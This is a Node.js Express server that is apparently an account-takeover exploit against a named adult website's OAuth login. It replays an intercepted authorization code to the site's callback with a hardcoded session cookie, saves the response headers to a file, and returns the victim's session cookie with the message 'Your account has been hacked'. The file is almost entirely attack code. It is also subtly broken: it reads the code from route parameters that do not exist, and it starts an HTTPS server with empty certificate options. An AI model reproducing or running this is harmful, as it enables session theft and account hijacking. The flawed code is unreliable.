const express = require('express');
const request = require('request');
const https = require('https');
const fs = require('fs');

const app = express();
// Set the trust proxy setting to true
app.set('trust proxy', true);
// Load the SSL certificate and key
const options = {
};
// Route that takes in all params and generates a GET request to another server
app.get('/', (req, res) => {
    const { code } = req.params;
    const requestOptions = {
        url: `https://pornbox.com/auth/provider/callback?code=${code}`,
        headers: {
            'Cookie': 'http_referer=; entry_point=https%3A%2F%2Fpornbox.com%2F; boxsessid=s%3AKKulD86YoRInEjJ6c1-KxbkVQIMd9U76.fjQcg3pwxtHO0h5WwX>'
        }
    };

    // Send the HTTPS request
    https.get(requestOptions, (response) => {
        // Save the response headers to a local file
        const headers = response.headers;
        const setCookieHeader = response.headers['set-cookie'];
        const cookieValue = setCookieHeader && setCookieHeader.length > 0 ? setCookieHeader.map(c => c.split(';')[0]).join('; ') : '';

        const formattedHeaders = JSON.stringify(headers, null, 4)
        const separator = '\n\n--------------------------------------------------------------\n\n';
        fs.appendFile('res.txt', `${separator}${formattedHeaders}`, (err) => {
            if (err) throw err;
            console.log('Response headers saved to res.txt');
        });

        // Return a success message with the response headers
        res.status(200).send(`Your account has been hacked, your session cookie is: ${cookieValue}`);
    }).on('error', (error) => {
        console.error(error);
        return res.status(500).send('Error');
    });
});

// Start the Express app on port 443 (HTTPS)
https.createServer(options, app).listen(443, () => {
    console.log('Express server listening on port 443 (HTTPS)');
});